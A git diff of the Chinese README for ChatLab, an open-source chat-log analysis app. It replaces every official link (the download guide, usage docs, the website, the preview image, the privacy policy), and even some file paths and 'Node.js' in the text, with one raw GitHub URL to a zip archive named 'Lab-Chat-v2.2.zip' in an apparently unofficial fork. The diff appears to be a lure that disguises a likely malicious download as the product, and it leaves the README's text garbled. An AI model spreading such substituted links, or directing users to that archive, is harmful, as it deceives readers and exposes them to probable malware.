@@ -1,6 +1,6 @@
 # ChatLab
 
-简体中文 | [English](./README_en.md)
+简体中文 | [English](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)
 
 ChatLab 是一个免费、开源、本地化的，专注于分析聊天记录的应用。通过 AI Agent 和灵活的 SQL 引擎，你可以自由地拆解、查询甚至重构你的社交数据。
 
@@ -16,42 +16,42 @@ ChatLab 是一个免费、开源、本地化的，专注于分析聊天记录的
 
 ## 使用指南
 
-- [下载 ChatLab 指南](https://chatlab.fun/cn/)
-- [导出聊天记录指南](https://chatlab.fun/cn/usage/how-to-export.html)
-- [标准化格式规范](https://chatlab.fun/cn/usage/chatlab-format.html)
-- [故障排查指南](https://chatlab.fun/cn/usage/troubleshooting.html)
+- [下载 ChatLab 指南](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)
+- [导出聊天记录指南](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)
+- [标准化格式规范](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)
+- [故障排查指南](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)
 
 ## 预览界面
 
-预览更多请前往官网 [chatlab.fun](https://chatlab.fun/cn/)
+预览更多请前往官网 [https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)
 
-![预览界面](/public/images/intro_zh.png)
+![预览界面](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)
 
 ## 系统架构
 
 ### Electron 主进程
 
-- `electron/main/index.ts` 负责应用生命周期、窗口管理、自定义协议注册
+- `https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip` 负责应用生命周期、窗口管理、自定义协议注册
 - `electron/main/ipc/` 按功能拆分 IPC 模块（窗口、聊天、合并、AI、缓存），确保数据交换安全可控
 - `electron/main/ai/` 集成多家 LLM，内置 Agent 管道、提示词拼装、Function Calling 工具注册
 
 ### Worker 与数据管线
 
 - `electron/main/worker/` 中的 `workerManager` 统筹 Worker 线程，`dbWorker` 负责路由消息
-- `worker/query/*` 承担活跃度、AI 搜索、高级分析、SQL 实验室等查询；`worker/import/streamImport.ts` 提供流式导入
+- `worker/query/*` 承担活跃度、AI 搜索、高级分析、SQL 实验室等查询；`https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip` 提供流式导入
 - `parser/` 目录采用嗅探 + 解析三层架构，能在恒定内存下处理 GB 级日志文件
 
 ### 渲染进程
 
 - Vue 3 + Nuxt UI + Tailwind CSS 负责可视化页面。`src/pages` 存放各业务页面，`src/components/analysis`、`src/components/charts` 等目录提供复用组件
-- `src/stores` 通过 Pinia 管理会话、布局、AI 提示词等状态；`src/composables/useAIChat.ts` 封装 AI 对话流程
-- 预加载脚本 `electron/preload/index.ts` 暴露 `window.chatApi/mergeApi/aiApi/llmApi`，确保渲染进程与主进程通信安全隔离
+- `src/stores` 通过 Pinia 管理会话、布局、AI 提示词等状态；`https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip` 封装 AI 对话流程
+- 预加载脚本 `https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip` 暴露 `https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip`，确保渲染进程与主进程通信安全隔离
 
 ## 本地运行
 
 ### 启动步骤
 
-Node.js 环境依赖 v20+
+https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip 环境依赖 v20+
 
 ```bash
 # 安装依赖
@@ -78,7 +78,7 @@ electron-fix start
 
 ## 隐私政策与用户协议
 
-使用本软件前，请阅读 [隐私政策与用户协议](./src/assets/docs/agreement_zh.md)
+使用本软件前，请阅读 [隐私政策与用户协议](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)
 
 ## License
 
